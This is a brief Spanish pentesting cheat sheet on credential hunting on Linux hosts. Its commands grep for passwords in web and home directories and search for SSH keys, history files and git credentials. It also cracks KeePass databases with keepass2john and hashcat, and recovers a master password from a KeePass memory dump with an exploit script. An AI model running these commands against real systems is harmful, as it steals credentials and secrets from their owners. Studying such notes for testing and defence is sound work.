Credenciales

La búsqueda de credenciales debe centrarse en rutas probables y archivos de configuración. No todo resultado con la palabra password es útil: hay que validar contexto, permisos y reutilización.

Buscar palabras claves en el sistema

grep -nri "password" /var/www /opt /home # Solo en esas rutas
grep -B5 -A5 "password" settings.php     # Solo ese archivo leyendo 5 líneas
grep -nri "db_user"
grep -rE "db_user|password"
grep -riE "PASSW|PASSWD|PWD"
# -r: recursivo -i: case-insensitive -n: línea_match -E: permite expresiones regulares (|)

find /home -exec ls -lad $PWD/* "{}" 2>/dev/null \; | grep -i -I "passw\|pwd"

grep --color=auto -rnw -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always 2>/dev/null

Buscar en Home

find /home -type f \( -name "*_history" -o -name "id_rsa" -o -name ".git-credentials" -o -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null

Buscar en /var/www

grep --color=auto -rnw /var/www/ -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always | grep -v ".js" 2>/dev/null

Keepass (.kdbx .dmp)

Kali: En caso de encontrar un fichero .kdbx leemos su información

python2.7 keepass2john.py <fichero.kdbx>
hashcat -m 13400 <keepass_hash> /seclists/Passwords/Leaked-Databases/rockyou.txt

Si además aparece un volcado de memoria de KeePass, se puede revisar si aplica la técnica documentada en keepass-dump-masterkey. No es universal: depende de la versión, del estado de la memoria y de cómo se obtuvo el dump.

Kali: Recuperar contraseña maestra de .dmp

python3 exploit.py KeePassDumpFull.dmp

Kali: Acceso Interfaz de Keepass

sudo apt install keepassxc
keepassxc passcodes.kdbx
